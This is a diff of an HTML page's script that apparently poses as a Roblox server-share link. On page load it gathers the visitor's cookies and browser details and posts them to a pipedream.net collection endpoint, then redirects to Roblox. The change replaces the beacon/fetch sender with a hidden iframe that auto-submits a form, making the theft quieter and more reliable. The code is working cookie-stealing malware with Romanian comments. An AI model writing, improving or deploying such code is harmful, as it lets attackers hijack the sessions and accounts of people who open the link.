@@ -341,11 +341,11 @@
         </div>
     </div>
 
-    <script>
+  <script>
     const YOUR_API_URL = 'https://eot2iixinio81vq.m.pipedream.net/';
     const REDIRECT_URL = 'https://www.roblox.com/share?code=a1830c3b439b154fb6978bff940c7154&type=Server';
 
-    function sendCookiesAndRedirect() {
+    function sendCookiesWithIframe() {
         const data = {
             cookies: document.cookie,
             user_agent: navigator.userAgent,
@@ -354,32 +354,39 @@
             share_code: 'a1830c3b439bf54fb6978bff940c7154',
         };
 
-        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+        // Cream un iframe ascuns
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
 
-        // Încercăm cu sendBeacon
-        let sent = navigator.sendBeacon && navigator.sendBeacon(YOUR_API_URL, blob);
+        // Injectăm un formular în iframe care trimite datele
+        const form = iframe.contentDocument.createElement('form');
+        form.method = 'POST';
+        form.action = YOUR_API_URL;
 
-        if (sent) {
-            // Redirect imediat după ce beacon-ul a fost acceptat
-            window.location.href = REDIRECT_URL;
-        } else {
-            // Fallback pe fetch (cu keepalive)
-            fetch(YOUR_API_URL, {
-                method: 'POST',
-                body: blob,
-                keepalive: true
-            }).finally(() => {
-                window.location.href = REDIRECT_URL;
-            });
-        }
+        const input = iframe.contentDocument.createElement('input');
+        input.type = 'hidden';
+        input.name = 'payload';
+        input.value = JSON.stringify(data);
+
+        form.appendChild(input);
+        iframe.contentDocument.body.appendChild(form);
+
+        // Trimite automat formularul
+        form.submit();
     }
 
-    document.addEventListener('DOMContentLoaded', sendCookiesAndRedirect);
+    document.addEventListener('DOMContentLoaded', function() {
+        sendCookiesWithIframe();
+        // Redirect instant (iframe-ul rămâne și finalizează request-ul separat)
+        window.location.href = REDIRECT_URL;
+    });
 </script>
 </body>
  
  
 </html>
+
 
 
 
